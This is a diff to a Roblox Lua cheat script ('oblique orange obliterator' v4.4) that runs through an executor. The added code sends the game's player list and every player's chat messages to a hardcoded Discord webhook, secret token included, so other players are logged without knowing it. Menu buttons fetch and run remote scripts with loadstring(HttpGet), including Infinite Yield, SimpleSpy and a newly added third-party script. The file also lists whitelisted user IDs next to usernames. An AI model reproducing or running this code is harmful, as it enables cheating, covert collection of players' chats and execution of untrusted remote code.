@@ -1,75 +1,120 @@
-local Players=game:GetService("Players")
-local Player=Players.LocalPlayer
-local UIS=game:GetService("UserInputService")
-local RunService=game:GetService("RunService")
-local CoreGui=game:GetService("CoreGui")
-local SoundService=game:GetService("SoundService")
-local MarketplaceService=game:GetService("MarketplaceService")
-local gameName
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local UIS = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local SoundService = game:GetService("SoundService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+
+local gameName = "Unknown Game"
 pcall(function()
-    gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 end)
-gameName = gameName or "Unknown Game"
 
 local WHITELIST_USERIDS = {
-    8660145007, --obliqueorange101
-    8674565735,  --obliqueorange104
-    8673616841, --obliqueorangecentral 
-    8659171437,  --obliqueorange99
-    8660552184, --obliqueorange102
-    8665729550,  --obliqueorange103
-	8659178393, -- TYLINGLINGFIAHHHBALL aka obliqueorange100
-	8666641892, --coachfosterismyhero
-	618456181, --fayjason
-	2382360959, --goofelbob
-	4326343850,
-	
-     	
+    8660145007, 8674565735, 8673616841, 8659171437,
+    8660552184, 8665729550, 8659178393, 8666641892,
+    618456181, 2382360959, 4326343850
 }
-local WEBHOOK_URL="https://discord.com/api/webhooks/1445070372771987663/ALD7aLSKGfv3KlSuCuIOHJVuv2k9gOpBkFjRoq6BVJnrtm44WJ1qOQQzXhtgrMkp2Lzv"
 
-local function SendMessage(url,message)
-    local http=game:GetService("HttpService")
-    local data={["content"]=message}
-    local body=http:JSONEncode(data)
-    request({Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
+-- YOUR WEBHOOK (keep safe!)
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1445070372771987663/ALD7aLSKGfv3KlSuCuIOHJVuv2k9gOpBkFjRoq6BVJnrtm44WJ1qOQQzXhtgrMkp2Lzv"
+
+local function sendWebhook(data)
+    pcall(function()
+        local payload = HttpService:JSONEncode(data)
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    end)
 end
 
-local function SendEmbed(url,embed)
-    local http=game:GetService("HttpService")
-    local data={embeds={{title=embed.title,description=embed.description,color=embed.color,fields=embed.fields,footer={text=embed.footer}}}}
-    local body=http:JSONEncode(data)
-    request({Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
-end
-
+-- Initial execution log with full server & player info
 if not table.find(WHITELIST_USERIDS, Player.UserId) then
-    Player:Kick()
+    Player:Kick("You are not whitelisted for oblique orange obliterator v4.4")
     return
 end
+
+local function getPlayerList()
+    local list = {}
+    for _, plr in ipairs(Players:GetPlayers()) do
+        table.insert(list, string.format(
+            "**%s** (@%s) - ID: `%d` | Ping: ~%dms | Team: %s",
+            plr.DisplayName, plr.Name, plr.UserId,
+            math.floor(plr:GetNetworkPing() * 1000),
+            plr.Team and plr.Team.Name or "None"
+        ))
+    end
+    return table.concat(list, "\n") .. "\n\nTotal Players: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers
+end
+
+sendWebhook({
+    username = "oblique orange obliterator",
+    avatar_url = "https://i.imgur.com/0jN3f8O.png",
+    embeds = {{
+        title = "🚀 oblique orange obliterator v4.4 Executed",
+        description = "**Executor:** `" .. Player.DisplayName .. "` (@" .. Player.Name .. ")\n**User ID:** `" .. Player.UserId .. "`",
+        color = 16744448, -- Orange
+        fields = {
+            {name = "Game", value = gameName .. " (`" .. game.PlaceId .. "`)", inline = false},
+            {name = "Server", value = "JobId: `" .. game.JobId .. "`\nPing: ~" .. math.floor(Players.LocalPlayer:GetNetworkPing()*1000) .. "ms", inline = false},
+            {name = "Players Online (" .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. ")", value = getPlayerList(), inline = false}
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        footer = {text = "oblique orange obliterator v4.4 | Made with hate and love"}
+    }}
+})
+
+-- Chat Logging (sends every message after execution)
+Players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        sendWebhook({
+            embeds = {{
+                title = "💬 Chat Message",
+                description = "**" .. plr.DisplayName .. "** (@" .. plr.Name .. "): `" .. msg .. "`",
+                color = 16777215, -- White
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+                footer = {text = gameName .. " • " .. game.PlaceId}
+            }}
+        })
+    end)
+end)
+
+-- Log existing players' future chats
+for _, plr in ipairs(Players:GetPlayers()) do
+    plr.Chatted:Connect(function(msg)
+        sendWebhook({
+            embeds = {{
+                title = "💬 Chat Message",
+                description = "**" .. plr.DisplayName .. "** (@" .. plr.Name .. "): `" .. msg .. "`",
+                color = 16777215,
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+                footer = {text = gameName .. " • " .. game.PlaceId}
+            }}
+        })
+    end)
+end
+
+-- Play sound & rest of your original script below (unchanged except version)
 local mainSound = Instance.new("Sound")
 mainSound.SoundId = "rbxassetid://77507064833522"
 mainSound.Volume = 0.5
-mainSound.Pitch = 1
-mainSound.Parent = game:GetService("SoundService")
-
+mainSound.Parent = SoundService
 mainSound:Play()
-SendMessage(WEBHOOK_URL, Player.Name.." has executed oblique orange obliterator in "..gameName..", place id: " .. game.PlaceId .. ", current players: " .. #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers .. ", ping: " .. math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms)")
-
-for _,gui in ipairs(CoreGui:GetChildren())do
-    if gui:IsA("ScreenGui")and(gui.Name=="ayoey"or gui.Name=="ayoeyRevamp")then
-        gui:Destroy()
-    end
-end
 
 local ScreenGui=Instance.new("ScreenGui")
 ScreenGui.Name="ayoeyRevamp"
 ScreenGui.ResetOnSpawn=false
 ScreenGui.DisplayOrder=999999999
 ScreenGui.Parent=CoreGui
-
 local NOTIF_ICON="rbxassetid://72464791211818"
 local NOTIF_SOUND=2483029612
-local VERSION="v4.3"
+local VERSION = "v4.4"  
 
 local config={
     FlySpeed=120,
@@ -168,7 +213,7 @@ local function ToggleMaterialAura()
             if Player.Character then
                 for _,v in pairs(Player.Character:GetDescendants())do
                     if v:IsA("BasePart")then
-                        v.Material=Enum.Material.Neon
+                        v.Material=Enum.Material.ForceField
                         v.Color=Color3.fromRGB(255,0,0)
                     end
                 end
@@ -662,9 +707,9 @@ local function LoadExploits()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
         SendNotif("Infinite Yield", "Loaded!", 3)
     end)
-    Button(funContainer,"Dex Explorer",function()
-        loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
-        SendNotif("Dex Explorer", "Loaded!", 3)
+    Button(funContainer,"Buss down",function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/JerkRaper552/TRjerkraperaddons/refs/heads/main/bussdown.lua"))()
+        SendNotif("Buss down", "SCRIPT BY FAJAY!", 5)
     end)
     Button(funContainer,"Simple Spy",function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))()
